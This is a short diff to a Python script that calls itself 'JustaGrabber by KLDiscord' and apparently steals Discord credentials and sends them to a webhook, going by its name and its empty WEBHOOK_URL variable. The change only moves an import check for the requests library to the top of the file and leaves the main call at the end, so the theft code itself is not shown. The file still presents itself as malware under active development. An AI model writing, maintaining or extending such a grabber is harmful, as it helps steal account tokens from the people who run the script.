@@ -10,6 +10,14 @@
      + This is not the last version of justagrabber, I will update many functions!!
 """ # JustaGrabber by KLDiscord
 
+# Module chekcer
+import sys
+try:
+    import requests
+except ModuleNotFoundError: # If requests module not exists, JustaGrabber will not do anything
+    sys.exit()
+
+
 import os, re, json, urllib.request,datetime # Importing modules
 
 WEBHOOK_URL = ''
@@ -150,11 +158,5 @@ def JustaGrabber():
     except:
         pass
 
-# Module chekcer
-import sys
-try:
-    import requests
-    if __name__ == "__main__":
-        JustaGrabber()
-except ModuleNotFoundError: # If requests module not exists, JustaGrabber will not do anything
-    sys.exit()
+if __name__ == "__main__":
+    JustaGrabber()
